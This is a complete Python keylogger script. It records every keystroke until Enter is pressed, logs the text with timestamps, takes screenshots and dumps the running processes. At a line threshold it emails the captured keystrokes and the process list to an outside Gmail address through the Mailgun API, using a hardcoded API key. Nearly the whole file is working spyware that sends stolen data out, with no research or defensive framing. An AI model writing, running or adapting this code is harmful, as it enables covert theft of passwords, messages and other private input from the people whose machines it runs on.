import keyboard
import requests
import datetime
import time
import pyscreenshot as ImageGrab
import subprocess


def processlist_sort():
    file = open("Process_list.txt", "r")
    sortedlist = file.read()
    sortedlist.replace("\r\r\n'b'", "\t")

def screenShot():
    # fullscreen
    im=ImageGrab.grab()
    im.save("file.png")

def file_flush():
    f = open("LOG.txt", 'w')
    f.write("\n")
    f.close()

def file_input(recorded):
    now_time = datetime.datetime.now()
    w = open("LOG.txt", 'a')

    w.write("\n")
    w.write(str(recorded))
    w.write("\n")
    w.write("\n")
    w.write("--------------------------------------\n")
    w.write("\n")
    w.write(str(now_time))
    w.write("\n")
    w.write("--------------------------------------\n")
    w .close()

def file_write(typedstr):
    w = open("LOG.txt", 'a')
    w.write("\n")
    w.write(typedstr)
    w.write("\n")
    w.write("\n")
    w.write("--------------------------------------\n")
    w.close()

def send_simple_message(file_content):
    return requests.post(
        "https://api.mailgun.net/v3/mg.ladmail.com/messages",
        auth=("api", "key-a65a55fe6f78da49a3addfd94fa83b87"),
        data={"from": "HookerFromLaptop_1 <postmaster@mg.ladmail.com>",
              "to": "lad <hth225@gmail.com>",
              "subject": "Hello lad, Here is Keylogging result",
              "text":  file_content
              })

def send_LOG():
    return requests.post(
        "https://api.mailgun.net/v3/mg.ladmail.com/messages",
        auth=("api", "key-a65a55fe6f78da49a3addfd94fa83b87"),
        files=[("attachment", open("Process_list.txt"))],
        data={"from": "PSManagerFromLaptop_1 <postmaster@mg.ladmail.com>",
              "to": "lad <hth225@gmail.com>",
              "subject": "Hello lad, Here is captured Process Logfile",
              "text": "CAPTURED PROCESS LOGFILE you should view on google docs"
              })

def parse_process_list():
    cmd = 'tasklist /v'
    proc = subprocess.getoutput(cmd).split("\n")
    file = open("Process_list.txt", "w+")
    file.write(str(proc))
    file.close()


if __name__ == "__main__":
     print('start')
     while 1:
         status = time.localtime()
         recorded = keyboard.record(until='enter')
         typedstr = " ".join(keyboard.get_typed_strings(recorded))
         file_input(recorded)
         file_write(typedstr)

         f = open("LOG.txt", 'r')
         file_content = f.read()
         f.close()

         with open('LOG.txt') as f:
             # len(f.readlines())
             count = (sum(1 for _ in f))
             print ('count:', count)

         if (count >= 400):
            screenShot()
            parse_process_list()
            send_simple_message(file_content)
            send_LOG()
            print("done")
            file_flush()